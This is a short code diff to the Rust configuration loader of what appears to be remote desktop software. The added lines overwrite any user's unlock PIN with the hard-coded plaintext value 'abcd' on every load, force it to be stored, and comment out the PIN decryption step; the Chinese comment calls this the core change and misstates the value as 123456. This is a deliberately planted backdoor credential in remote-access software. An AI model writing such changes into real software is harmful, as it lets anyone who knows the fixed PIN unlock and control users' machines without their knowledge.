@@ -471,6 +471,11 @@ impl Config2 {
                 config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
                 store = true;
             }
+        // ==== 核心修改点：强制覆盖 unlock_pin 为明文 123456 ====
+        if config.unlock_pin != "abcd" {
+            config.unlock_pin = "abcd".to_string(); // 硬编码明文 PIN
+            store = true; // 强制触发存储
+        }
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -478,10 +483,10 @@ impl Config2 {
             config.socks = Some(socks);
             store |= store2;
         }
-        let (unlock_pin, _, store2) =
-            decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
-        config.unlock_pin = unlock_pin;
-        store |= store2;
+        // let (unlock_pin, _, store2) =
+        //    decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
+       // config.unlock_pin = unlock_pin;
+       // store |= store2;
         if store {
             config.store();
         }
